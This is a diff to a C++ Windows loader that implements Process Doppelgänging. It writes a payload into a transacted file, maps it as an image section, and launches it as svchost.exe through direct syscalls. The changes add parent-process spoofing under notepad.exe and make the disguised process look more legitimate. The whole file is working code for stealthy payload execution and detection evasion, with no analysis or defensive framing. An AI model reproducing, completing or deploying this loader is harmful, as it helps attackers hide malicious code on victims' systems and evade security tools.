@@ -7,13 +7,33 @@
 
 #include "syscalls.h"
 #include "base64.h"
-#include "sslClient.h"
 
 #pragma comment(lib, "KtmW32.lib")
 #pragma comment(lib, "Ntdll.lib")
 #pragma comment(lib, "Userenv.lib")
 
 #define PAGE_SIZE 0x1000
+
+HANDLE GetPpidByName(const std::wstring& processName)
+{
+    PROCESSENTRY32 entry;
+    entry.dwSize = sizeof(PROCESSENTRY32);
+
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+
+    if (Process32First(snapshot, &entry) == TRUE)
+    {
+        while (Process32Next(snapshot, &entry) == TRUE)
+        {
+            if (!processName.compare(entry.szExeFile))
+            {
+                CloseHandle(snapshot);
+                std::cout << "[+] Parent PID = " << entry.th32ProcessID << "\n";
+                return (HANDLE)entry.th32ProcessID;
+            }
+        }
+    }
+}
 
 BYTE* GetNtHeaders(const BYTE* pe_buffer)
 {
@@ -94,7 +114,6 @@ wchar_t* GetDirectoryName(IN wchar_t* full_path, OUT wchar_t* out_buf, IN const 
 
 bool SetParametersInPEB(PVOID params_base, HANDLE hProcess, PROCESS_BASIC_INFORMATION& pbi)
 {
-    // Get access to the remote PEB:
     ULONGLONG remote_peb_addr = (ULONGLONG)pbi.PebBaseAddress;
     if (!remote_peb_addr) {
         std::cerr << "Failed getting remote PEB address!" << std::endl;
@@ -103,10 +122,8 @@ bool SetParametersInPEB(PVOID params_base, HANDLE hProcess, PROCESS_BASIC_INFORM
     PEB peb_copy = { 0 };
     ULONGLONG offset = (ULONGLONG)&peb_copy.ProcessParameters - (ULONGLONG)&peb_copy;
 
-    // Calculate offset of the parameters
     LPVOID remote_img_base = (LPVOID)(remote_peb_addr + offset);
 
-    //Write parameters address into PEB:
     SIZE_T written = 0;
     NTSTATUS status = SysNtWriteVirtualMemory10(hProcess, remote_img_base, &params_base, sizeof(PVOID), nullptr);
     return true;
@@ -116,10 +133,7 @@ bool BufferRemotePEB(HANDLE hProcess, PROCESS_BASIC_INFORMATION& pi, OUT PEB& pe
 {
     memset(&peb_copy, 0, sizeof(PEB));
     PPEB remote_peb_addr = pi.PebBaseAddress;
-#ifdef _DEBUG
-    std::cout << "PEB address: " << (std::hex) << (ULONGLONG)remote_peb_addr << std::endl;
-#endif 
-    // Write the payload's ImageBase into remote process' PEB:
+    
     NTSTATUS status = SysNtReadVirtualMemory10(hProcess, remote_peb_addr, &peb_copy, sizeof(PEB), NULL);
     if (status != STATUS_SUCCESS)
     {
@@ -136,7 +150,6 @@ LPVOID WriteParametersInProcess(HANDLE hProcess, PRTL_USER_PROCESS_PARAMETERS pa
     PVOID buffer = params;
     ULONG_PTR buffer_end = (ULONG_PTR)params + params->Length;
 
-    //params and environment in one space:
     if (params->Environment) {
         if ((ULONG_PTR)params > (ULONG_PTR)params->Environment) {
             buffer = (PVOID)params->Environment;
@@ -159,22 +172,17 @@ LPVOID WriteParametersInProcess(HANDLE hProcess, PRTL_USER_PROCESS_PARAMETERS pa
 
 bool InitProcessParameters(HANDLE hProcess, PROCESS_BASIC_INFORMATION& pi, LPWSTR targetPath)
 {
-    //---
     UNICODE_STRING uTargetPath = { 0 };
     RtlInitUnicodeString(&uTargetPath, targetPath);
-    //---
     wchar_t dirPath[MAX_PATH] = { 0 };
     GetDirectoryName(targetPath, dirPath, MAX_PATH);
     UNICODE_STRING uCurrentDir = { 0 };
     RtlInitUnicodeString(&uCurrentDir, dirPath);
-    //---
     wchar_t dllDir[] = L"C:\\Windows\\System32";
     UNICODE_STRING uDllDir = { 0 };
     RtlInitUnicodeString(&uDllDir, dllDir);
-    //---
     UNICODE_STRING uWindowName = { 0 };
-    wchar_t windowName[] = L"Process Doppleganging";
-    RtlInitUnicodeString(&uWindowName, windowName);
+    RtlInitUnicodeString(&uWindowName, targetPath);
 
     LPVOID environment;
     CreateEnvironmentBlock(&environment, NULL, TRUE);
@@ -205,9 +213,7 @@ bool InitProcessParameters(HANDLE hProcess, PROCESS_BASIC_INFORMATION& pi, LPWST
         std::cout << "[+] Cannot make a remote copy of parameters: " << GetLastError() << std::endl;
         return false;
     }
-#ifdef _DEBUG
-    std::cout << "[+] Parameters mapped!" << std::endl;
-#endif
+    
     PEB peb_copy = { 0 };
     if (!BufferRemotePEB(hProcess, pi, peb_copy)) {
         return false;
@@ -217,18 +223,12 @@ bool InitProcessParameters(HANDLE hProcess, PROCESS_BASIC_INFORMATION& pi, LPWST
         std::cout << "[+] Cannot update PEB: " << GetLastError() << std::endl;
         return false;
     }
-#ifdef _DEBUG
-    if (!BufferRemotePEB(hProcess, pi, peb_copy)) {
-        return false;
-    }
-    std::cout << "> ProcessParameters addr: " << peb_copy.ProcessParameters << std::endl;
-#endif
+    
     return true;
 }
 
-bool ProcessDoppel(wchar_t* targetPath, BYTE* payladBuf, DWORD payloadSize)
+bool ProcessDoppel(wchar_t* targetPath, const wchar_t* parentProcess, BYTE* payladBuf, DWORD payloadSize)
 {
-    // Create transaction
     DWORD options, isolationLvl, isolationFlags, timeout;
     options = isolationLvl = isolationFlags = timeout = 0;
 
@@ -239,7 +239,6 @@ bool ProcessDoppel(wchar_t* targetPath, BYTE* payladBuf, DWORD payloadSize)
         return false;
     }
 
-    // Open transaction file
     HMODULE lib = LoadLibraryA("ntdll.dll");
     RTLSETCURRENTTRANSACTION pfnRtlSetCurrentTransaction = (RTLSETCURRENTTRANSACTION)GetProcAddress(lib, "RtlSetCurrentTransaction");
     
@@ -251,17 +250,15 @@ bool ProcessDoppel(wchar_t* targetPath, BYTE* payladBuf, DWORD payloadSize)
     UNICODE_STRING fileName;
     
     ZeroMemory(&block, sizeof(IO_STATUS_BLOCK));
-    RtlInitUnicodeString(&fileName, (PCWSTR)L"\\??\\c:\\Users\\Public\\nonexistant.exe");
+    RtlInitUnicodeString(&fileName, (PCWSTR)L"\\??\\c:\\Users\\Public\\nonexistant.txt");
     InitializeObjectAttributes(&fileAttributes, &fileName, 0x00000040, NULL, NULL);
     status = SysNtCreateFile10(&hTransactedFile, FILE_GENERIC_READ | FILE_GENERIC_WRITE, &fileAttributes, &block, nullptr, FILE_ATTRIBUTE_NORMAL, 0, 0x00000003, 0x00000020, NULL, 0);
-
+    
     transaction = pfnRtlSetCurrentTransaction(nullptr);
 
-    // Write payload to transaction
     ZeroMemory(&block, sizeof(IO_STATUS_BLOCK));
     status = SysNtWriteFile10(hTransactedFile, nullptr, nullptr, nullptr, &block, payladBuf, payloadSize, nullptr, nullptr);
 
-    // Create section and close transaction
     HANDLE hSection = nullptr;
     status = SysNtCreateSection10(&hSection, SECTION_ALL_ACCESS, NULL, 0, PAGE_READONLY, SEC_IMAGE, hTransactedFile);
 
@@ -279,14 +276,14 @@ bool ProcessDoppel(wchar_t* targetPath, BYTE* payladBuf, DWORD payloadSize)
     CloseHandle(hTransaction);
     hTransaction = nullptr;
 
-    // Start open handle to parent and start process
     HANDLE hParent = nullptr;
 
     OBJECT_ATTRIBUTES objectAttributes;
     InitializeObjectAttributes(&objectAttributes, NULL, 0, NULL, NULL);
 
+
     CLIENT_ID clientId = { 0 };
-    clientId.UniqueProcess = (HANDLE)16120; // PPID
+    clientId.UniqueProcess = GetPpidByName(parentProcess);
     clientId.UniqueThread = (HANDLE)0;
 
     status = SysNtOpenProcess10(&hParent, PROCESS_ALL_ACCESS, &objectAttributes, &clientId);
@@ -302,7 +299,6 @@ bool ProcessDoppel(wchar_t* targetPath, BYTE* payladBuf, DWORD payloadSize)
         return false;
     }
 
-    // Obtain entry point 
     PROCESS_BASIC_INFORMATION pi = { 0 };
 
     DWORD ReturnLength = 0;
@@ -317,9 +313,7 @@ bool ProcessDoppel(wchar_t* targetPath, BYTE* payladBuf, DWORD payloadSize)
         return false;
     }
     ULONGLONG imageBase = (ULONGLONG)peb_copy.ImageBaseAddress;
-#ifdef _DEBUG
-    std::cout << "ImageBase address: " << (std::hex) << (ULONGLONG)imageBase << std::endl;
-#endif
+    
     DWORD payload_ep = GetEntryPointRVA(payladBuf);
     ULONGLONG procEntry = payload_ep + imageBase;
 
@@ -327,13 +321,10 @@ bool ProcessDoppel(wchar_t* targetPath, BYTE* payladBuf, DWORD payloadSize)
         std::cerr << "Parameters setup failed" << std::endl;
         return false;
     }
-    std::cout << "[+] Process created! Pid = " << GetProcessId(hProcess) << "\n";
-#ifdef _DEBUG
-    std::cerr << "EntryPoint at: " << (std::hex) << (ULONGLONG)procEntry << std::endl;
-#endif
+    std::cout << "[+] Process created! PID = " << GetProcessId(hProcess) << "\n";
+    
     HANDLE hThread = NULL;
 
-    // Create remote thread
     status = SysNtCreateThreadEx10(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)procEntry, NULL, FALSE, 0, 0, 0, NULL);
 
     if (status != STATUS_SUCCESS) {
@@ -346,10 +337,13 @@ bool ProcessDoppel(wchar_t* targetPath, BYTE* payladBuf, DWORD payloadSize)
 
 int ProcessDoppleganging(BYTE* memBuffer, size_t payloadSize)
 {
-    wchar_t defaultTarget[] = L"C:\\Windows\\System32\\svchost.exe";
+    wchar_t defaultTarget[] = L"C:\\WINDOWS\\System32\\svchost.exe";
     wchar_t* targetPath = defaultTarget;
 
-    bool is_ok = ProcessDoppel(targetPath, memBuffer, (DWORD)payloadSize + 626);
+    wchar_t parentProcess_[] = L"notepad.exe";
+    wchar_t* parentProcess = parentProcess_;
+
+    bool is_ok = ProcessDoppel(targetPath, parentProcess ,memBuffer, (DWORD)payloadSize + 626);
 
     FreeBuffer(memBuffer, payloadSize);
     if (is_ok) {
